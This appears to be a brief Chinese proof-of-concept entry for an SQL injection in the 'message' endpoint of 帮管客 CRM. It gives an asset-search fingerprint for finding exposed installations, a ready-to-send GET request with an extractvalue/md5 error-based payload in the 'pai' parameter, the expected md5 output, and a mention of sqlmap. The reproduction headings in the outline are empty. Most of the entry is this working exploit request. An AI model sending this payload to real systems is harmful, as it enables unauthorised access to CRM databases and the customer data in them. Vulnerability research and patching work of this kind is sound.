# 帮管客CRMmessage存在SQL注入漏洞

- **系统**：帮管客　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="帮管客-CRM"`
- **请求**：`GET /index.php/message?page=1&pai=1%20and%20extractvalue(0x7e,concat(0x7e,(select+md5(1)),0x7e))%23&xu=desc HTTP/1.1`

**请求体 / payload**
```
c4ca4238a0b923820dcc509a6f75849
sqlmap
/index.php/message?page=1&pai=1
```

**其他**
- 帮管客CRM message存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 帮管客CRM